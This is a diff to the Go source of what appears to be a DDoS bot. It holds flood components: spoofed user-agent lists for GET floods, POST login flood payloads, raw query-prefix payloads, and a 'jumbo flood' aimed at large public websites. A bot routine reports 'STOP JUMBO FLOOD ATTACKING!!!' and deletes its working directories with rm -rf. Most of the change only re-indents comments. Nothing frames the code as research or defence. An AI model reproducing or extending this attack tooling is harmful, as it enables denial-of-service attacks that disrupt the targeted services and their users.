@@ -6,7 +6,7 @@ import (
 )
 
 /*
-	GET flood Agents.
+GET flood Agents.
 */
 var httpAgents = []string{
 	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
@@ -32,7 +32,7 @@ var httpAgents = []string{
 }
 
 /*
-	POST login flood payloads.
+POST login flood payloads.
 */
 var (
 	postPayload, _ = json.Marshal(map[string]string{
@@ -47,7 +47,7 @@ var (
 )
 
 /*
-	Other payloads.
+Other payloads.
 */
 const (
 	queryPrefix  = "\xff\xff\xff\xff"
@@ -57,7 +57,7 @@ const (
 )
 
 /*
-	Increase more size of a jumbo flood.
+Increase more size of a jumbo flood.
 */
 const (
 	apple = "https://www.apple.com"
@@ -272,7 +272,7 @@ func (b *Bot) JUMBO() {
 	}
 	if callSwitch, keySwitch := SetupCaller(); keySwitch {
 		if callSwitch.CallAttack.reportSwitch {
-			execComd("rm", "-rf", ".apple", ".weibo", ".qq", ".ebay")
+			execComd("rm", "-rf", ".pull_apple", ".pull_weibo", ".pull_qq", ".pull_ebay", ".pull_huya")
 			b.Report("STOP JUMBO FLOOD ATTACKING!!!")
 		}
 	}
